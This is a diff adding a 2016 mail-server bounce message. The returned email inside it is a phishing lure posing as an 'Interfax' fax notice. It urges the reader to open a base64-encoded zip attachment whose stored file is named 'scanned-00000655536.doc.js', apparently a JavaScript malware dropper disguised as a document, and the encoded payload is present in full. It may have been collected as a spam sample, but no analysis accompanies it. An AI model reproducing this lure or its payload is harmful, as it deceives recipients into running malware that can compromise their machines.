@@ -1,0 +1,120 @@
+Return-path: <>
+Envelope-to: bdshun67mo@shost011.tenten.vn
+Delivery-date: Tue, 16 Feb 2016 15:59:57 +0700
+Received: from mailnull by shost011.tenten.vn with local (Exim 4.86)
+	id 1aVbUD-002m9l-S5
+	for bdshun67mo@shost011.tenten.vn; Tue, 16 Feb 2016 15:59:57 +0700
+X-Failed-Recipients: cynkane@mac.com
+Auto-Submitted: auto-replied
+From: Mail Delivery System <Mailer-Daemon@shost011.tenten.vn>
+To: bdshun67mo@shost011.tenten.vn
+Content-Type: multipart/report; report-type=delivery-status; boundary=1455613197-eximdsn-1461650958
+MIME-Version: 1.0
+Subject: Mail delivery failed: returning message to sender
+Message-Id: <E1aVbUD-002m9l-S5@shost011.tenten.vn>
+Date: Tue, 16 Feb 2016 15:59:57 +0700
+
+--1455613197-eximdsn-1461650958
+Content-type: text/plain; charset=us-ascii
+
+This message was created automatically by mail delivery software.
+
+A message that you sent could not be delivered to one or more of its
+recipients. This is a permanent error. The following address(es) failed:
+
+  cynkane@mac.com
+    host mx2.mail.icloud.com [17.172.34.11]
+    SMTP error from remote mail server after RCPT TO:<cynkane@mac.com>:
+    550 5.7.1  Mail from IP 103.18.6.161 was rejected due to listing in Spamhaus XBL. For details please see http://www.spamhaus.org/query/bl?ip=103.18.6.161 :
+    cynkane@mac.com
+
+--1455613197-eximdsn-1461650958
+Content-type: message/delivery-status
+
+Reporting-MTA: dns; shost011.tenten.vn
+
+Action: failed
+Final-Recipient: rfc822;cynkane@mac.com
+Status: 5.0.0
+Remote-MTA: dns; mx2.mail.icloud.com
+Diagnostic-Code: smtp; 550 5.7.1  Mail from IP 103.18.6.161 was rejected due to listing in Spamhaus XBL. For details please see http://www.spamhaus.org/query/bl?ip=103.18.6.161 : cynkane@mac.com
+
+--1455613197-eximdsn-1461650958
+Content-type: message/rfc822
+
+Return-path: <bdshun67mo@shost011.tenten.vn>
+Received: from bdshun67mo by shost011.tenten.vn with local (Exim 4.86)
+	(envelope-from <bdshun67mo@shost011.tenten.vn>)
+	id 1aVbU5-002m29-FA
+	for cynkane@mac.com; Tue, 16 Feb 2016 15:59:55 +0700
+To: cynkane@mac.com
+Subject: You have new fax, document 00000655536
+X-PHP-Script: bdshungthinhland.com/post.php for 173.254.28.18
+Date: Tue, 16 Feb 2016 08:59:49 +0000
+From: "Interfax Online" <incoming@interfax.net>
+Reply-To: "Interfax Online" <incoming@interfax.net>
+Message-ID: <b786eb0d8de0f1713b530027347a38fe@interfax.net>
+X-Priority: 3
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="b1_6e44775df3c506736ee3df6d2ed7ea73"
+Content-Transfer-Encoding: 8bit
+X-OutGoing-Spam-Status: No, score=4.5
+
+--b1_6e44775df3c506736ee3df6d2ed7ea73
+Content-Type: text/plain; charset=us-ascii
+
+You have a new fax!
+
+Please download attached fax document.
+
+Scanned at:           Tue, 16 Feb 2016 07:56:53 +0300
+Document name:        scanned-00000655536.doc
+Processed in:         49 seconds
+Quality:              300 DPI
+File size:            117 Kb
+Pages sent:           7
+Sender:               Ramon Singleton
+
+Thank you for using Interfax!
+
+
+--b1_6e44775df3c506736ee3df6d2ed7ea73
+Content-Type: application/zip; name="scanned-00000655536.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=scanned-00000655536.zip
+
+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
+AAEAAQBIAAAAtAUAAAAA
+
+
+--b1_6e44775df3c506736ee3df6d2ed7ea73--
+
+
+--1455613197-eximdsn-1461650958--
